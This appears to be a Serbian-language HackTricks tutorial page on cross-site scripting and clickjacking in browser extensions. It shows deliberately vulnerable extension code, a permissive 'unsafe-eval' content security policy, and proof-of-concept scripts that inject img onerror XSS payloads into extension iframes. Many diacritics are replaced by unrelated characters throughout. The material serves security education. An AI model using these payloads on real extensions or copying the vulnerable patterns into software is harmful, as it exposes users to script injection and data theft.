# BrowExt - Primer XSS napad

<details>

<summary><strong>Nau캜ite kako da hakujete AWS od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini da podr쬴te HackTricks:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Cross-Site Scripting (XSS) putem Iframe-a

U ovom scenariju, **content script** je implementiran kako bi instancirao Iframe, koji uklju캜uje URL sa upitnim parametrima kao izvor Iframe-a:
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
Javno dostupna HTML stranica, **`message.html`**, je dizajnirana da dinami캜ki dodaje sadr쬬j u tijelo dokumenta na osnovu parametara u URL-u:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
Na stranici protivnika izvr코ava se zlonamerni skript koji menja parametar `content` izvora Iframe-a kako bi se unela **XSS payload**. To se posti쬰 a쬿riranjem izvora Iframe-a da uklju캜uje 코tetnu skriptu:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
Preterasno dozvoljena politika bezbednosti sadr쬬ja, kao 코to je:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
omogu캖ava izvr코avanje JavaScript-a, 캜ine캖i sistem podlo쬹im XSS napadima.

Alternativni pristup za izazivanje XSS-a uklju캜uje kreiranje Iframe elementa i postavljanje izvora na uklju캜ivanje 코tetnog skripta kao parametra `content`:
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-bazirani XSS + ClickJacking

Ovaj primer je preuzet iz [originalnog posta](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

Osnovni problem proizlazi iz DOM-bazirane ranjivosti Cross-site Scripting (XSS) koja se nalazi u **`/html/bookmarks.html`**. Problematicni JavaScript deo, koji je deo **`bookmarks.js`**, je detaljno opisan ispod:
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
Ovaj odlomak dohva캖a **vrednost** iz polja za unos **`txtName`** i koristi **spajanje nizova da generi코e HTML**, koji se zatim dodaje u DOM kori코캖enjem jQuery-ove funkcije `.append()`.

Uobi캜ajeno, Chrome ekstenzija koristi Content Security Policy (CSP) koja bi spre캜ila ovakve ranjivosti. Me캠utim, zbog **opu코tanja CSP-a sa 'unsafe-eval'** i kori코캖enja jQuery-ovih metoda manipulacije DOM-om (koje koriste [`globalEval()`](https://api.jquery.com/jquery.globaleval/) da bi prosledile skripte funkciji [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) prilikom umetanja u DOM), eksploatacija je i dalje mogu캖a.

Iako je ova ranjivost zna캜ajna, njena eksploatacija obi캜no zavisi od interakcije korisnika: poseta stranici, uno코enje XSS payloada i aktiviranje dugmeta "Dodaj".

Da bi se ova ranjivost pobolj코ala, eksploati코e se sekundarna ranjivost **clickjacking**-a. Manifest Chrome ekstenzije prikazuje opse쬹u politiku `web_accessible_resources`:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Posebno, stranica **`/html/bookmarks.html`** je podlo쬹a framingu, te je ranjiva na **clickjacking**. Ova ranjivost se koristi za framing stranice unutar sajta napada캜a, prekrivaju캖i je DOM elementima kako bi se prevarantski redizajnirao interfejs. Ova manipulacija navodi rtve da nenamerno interaguju sa podrazumevanim pro코irenjem.

## Reference

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
